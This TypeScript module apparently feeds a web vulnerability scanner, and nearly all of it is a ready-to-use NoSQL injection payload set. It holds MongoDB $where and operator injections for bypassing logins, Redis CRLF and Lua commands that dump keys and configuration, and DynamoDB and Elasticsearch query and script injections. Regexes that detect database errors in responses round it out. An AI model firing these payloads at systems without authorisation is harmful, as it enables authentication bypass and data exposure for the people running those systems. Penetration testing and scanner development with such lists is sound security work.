// — MongoDB $where injection —
const MONGO_WHERE = [
  "'; return true; var x='",
  "1; return true",
  "this.password.match(/.*/i)",
  "function() { return true; }",
  "sleep(1)",
];

// — Syntax-breaking (MongoDB) —
const SYNTAX_BREAKING = ["'", '"', "{", "}", "\x00", "\\"];

// — Operator strings (injected as raw text) —
const OPERATOR_STRINGS = [
  '{"$ne":""}',
  '{"$gt":""}',
  '{"$regex":".*"}',
  '{"$where":"return true"}',
];

// — Redis CRLF command injection —
const REDIS_CRLF = [
  "\r\nINFO\r\n",
  "\r\nKEYS *\r\n",
  "\r\nCONFIG GET *\r\n",
  "\r\nCLIENT LIST\r\n",
];

// — Redis Lua injection —
const REDIS_LUA = ["redis.call('INFO')", "return redis.call('KEYS','*')"];

// — DynamoDB expression injection —
const DYNAMODB = ["OR :val = :val", "OR attribute_exists(password)"];

// — Elasticsearch query DSL injection —
const ELASTICSEARCH_QUERY = ['{"match_all":{}}', "*:*", "* OR 1:1", "_exists_:field"];

// — Elasticsearch script injection —
const ELASTICSEARCH_SCRIPT = ['{"script":{"source":"1+1"}}', "groovy: 1+1"];

export const NOSQL_PAYLOADS = [
  ...MONGO_WHERE,
  ...SYNTAX_BREAKING,
  ...OPERATOR_STRINGS,
  ...REDIS_CRLF,
  ...REDIS_LUA,
  ...DYNAMODB,
  ...ELASTICSEARCH_QUERY,
  ...ELASTICSEARCH_SCRIPT,
];

export interface OperatorPayload {
  label: string;
  value: Record<string, unknown>;
}

export const NOSQL_OPERATOR_PAYLOADS: OperatorPayload[] = [
  { label: "$ne", value: { $ne: "" } },
  { label: "$gt", value: { $gt: "" } },
  { label: "$gte", value: { $gte: "" } },
  { label: "$regex", value: { $regex: ".*" } },
  { label: "$in", value: { $in: [true, false, null, ""] } },
  { label: "$nin", value: { $nin: [] } },
  { label: "$exists", value: { $exists: true } },
  { label: "$ne null", value: { $ne: null } },
];

export const NOSQL_ERROR_PATTERNS: { engine: string; pattern: RegExp }[] = [
  // MongoDB
  { engine: "MongoDB", pattern: /MongoError/i },
  { engine: "MongoDB", pattern: /MongoServerError/i },
  { engine: "MongoDB", pattern: /E11000 duplicate key/i },
  { engine: "MongoDB", pattern: /BSONObj size/i },
  { engine: "MongoDB", pattern: /\$where not allowed/i },
  { engine: "MongoDB", pattern: /bad query/i },
  { engine: "MongoDB", pattern: /unknown operator/i },
  { engine: "MongoDB", pattern: /MongooseError/i },

  // Redis
  { engine: "Redis", pattern: /WRONGTYPE/i },
  { engine: "Redis", pattern: /ERR unknown command/i },
  { engine: "Redis", pattern: /ERR syntax error/i },
  { engine: "Redis", pattern: /NOAUTH/i },
  { engine: "Redis", pattern: /RedisError/i },
  { engine: "Redis", pattern: /ReplyError/i },
  { engine: "Redis", pattern: /ioredis/i },

  // DynamoDB
  { engine: "DynamoDB", pattern: /ValidationException/i },
  { engine: "DynamoDB", pattern: /SerializationException/i },
  { engine: "DynamoDB", pattern: /ConditionalCheckFailedException/i },
  { engine: "DynamoDB", pattern: /com\.amazonaws\.dynamodb/i },
  { engine: "DynamoDB", pattern: /ResourceNotFoundException/i },
  { engine: "DynamoDB", pattern: /ExpressionAttributeNames/i },

  // Elasticsearch
  { engine: "Elasticsearch", pattern: /SearchParseException/i },
  { engine: "Elasticsearch", pattern: /QueryParsingException/i },
  { engine: "Elasticsearch", pattern: /search_phase_execution_exception/i },
  { engine: "Elasticsearch", pattern: /parsing_exception/i },
  { engine: "Elasticsearch", pattern: /script_exception/i },
  { engine: "Elasticsearch", pattern: /org\.elasticsearch/i },
  { engine: "Elasticsearch", pattern: /illegal_argument_exception/i },
];
